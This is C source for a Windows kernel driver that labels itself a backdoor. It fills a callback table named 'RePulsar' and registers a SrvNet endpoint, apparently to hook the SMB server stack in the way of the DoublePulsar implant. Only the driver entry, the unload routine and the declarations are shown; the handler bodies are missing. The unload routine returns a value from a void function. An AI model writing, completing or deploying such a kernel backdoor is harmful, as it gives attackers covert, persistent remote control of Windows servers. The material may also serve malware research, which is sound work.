#include <ntifs.h>
#include "common.h"

NTSTATUS RegisterSrvNetEndpoint();
NTSTATUS DeregisterSrvNetEndpoint();
NTSTATUS ConnectCallback();
NTSTATUS ReceiveCallback();
NTSTATUS RegisterEndpoint();
NTSTATUS DeregisterEndpoint();
NTSTATUS DisconnectClient();
NTSTATUS NegotiateCallback(PVOID Unk0, ULONG InputBufferSize, PULONG InputBuffer);

void DriverUnload(PDRIVER_OBJECT pDriverObject);
PDEVICE_OBJECT DeviceObject;


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	
	DbgPrint("[+] Loading backdoor\n");
	pDriverObject->DriverUnload = &DriverUnload;
	memset(CallbackTable, 0, 0x50);
	CallbackTable[0] = 0x18;
	CallbackTable[1] = (__int64)"RePulsar";
	CallbackTable[3] = (__int64)RegisterEndpoint;
	CallbackTable[4] = (__int64)DeregisterEndpoint;
	CallbackTable[5] = (__int64)NegotiateCallback;
	CallbackTable[6] = (__int64)ConnectCallback;
	CallbackTable[7] = (__int64)ReceiveCallback;
	CallbackTable[8] = (__int64)DisconnectClient;
	CallbackTable[2] = 0x0;
	CallbackTable[11] = 0x3;
	CallbackTable[12] = 0x77;
	
	KIRQL irql;
	irql = KeGetCurrentIrql();
	DbgPrint("IRQL LEVEL: %d\n", irql);
	RegisterSrvNetEndpoint();
	

//	KeRaiseIrql(old, &old2);
//	DbgPrint("[+] Im returned... IRQL: %d\n", KeGetCurrentIrql());

	return STATUS_SUCCESS;
}

void DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("[+] Unloading backdoor\n");
	DeregisterSrvNetEndpoint();
	return STATUS_SUCCESS;
}